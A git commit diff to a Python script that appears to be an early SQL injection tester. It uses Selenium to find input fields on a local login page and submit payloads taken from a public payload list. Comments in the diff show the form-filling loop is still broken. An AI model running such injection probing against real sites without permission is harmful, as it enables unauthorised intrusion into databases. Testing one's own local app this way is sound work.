6442478aa8c96194740603363015f70d57aed32c
jimbeamman <jimbeamman999@gmail.com>
2023-04-13 16:56:22 -0400

    cannot repeat fill in form

--- sql_test.py
+++ sql_test.py
@@ -39,12 +39,11 @@ class SQL:
         
         
     #get from with Selenium  or javascipt?
+    #test with JS
     def get_form(self):
         self.driver.get(self.url)
-        elements = self.driver.find_elements(By.TAG_NAME, 'input')   #find xpath form
-        for e in elements:
-            print(e.text)
-            
+        elements = self.driver.find_elements(By.TAG_NAME, 'input')   #find xpath form -> not work 
+        return elements
             
     ###TODO###
     # collect and save node + edge
@@ -55,17 +54,29 @@ class SQL:
         #attack with headless 
             #wako == username, password
             #universal detection
+        
         payloads = self.get_sql_payload()
+        elements = self.get_form()
         result_payload =[]
         
-        for payload in payloads:
-            r = requests.post(self.url, data={'username':payload, 'password':''} )
-            if (re.search('error',r.text)):
-                result_payload.append(payload)
-                print(r.text)
-                break
-        print("First attack vector ->" + str(result_payload))
+        # for element in elements:
+        #     for payload in payloads:
+        #         r = requests.post(self.url, data={'username':element} )
+        #         if (re.search('error',r.text)):
+        #             result_payload.append(payload)
+        #             print(r.text)
+        #             break
+        #     print("First attack vector ->" + str(result_payload))
         
+        
+        ## cannot sent through Selenium -> send with request 
+        for element in elements:
+            for payload in payloads:
+                #element.send_keys(payload)
+                #send with selenium
+                element.send_keys(payload)
+                self.driver.find_element(By.XPATH,"//input[@type='submit']").click() #found problem becuase it cannot get the elemnents after sending
+                
     def get_sql_payload(self):  #reference sql payload https://github.com/payloadbox/sql-injection-payload-list need to add more
         sql_payloads = ['\\',
                         '\'',
@@ -84,7 +95,7 @@ class SQL:
 if __name__ == "__main__":
     #sql = SQL('http://localhost:8090/users/login.php').attack()
     
-    SQL(driver,'http://localhost:8090/users/login.php').get_form()
+    SQL(driver,'http://localhost:8090/users/login.php').attack()
 
 
 
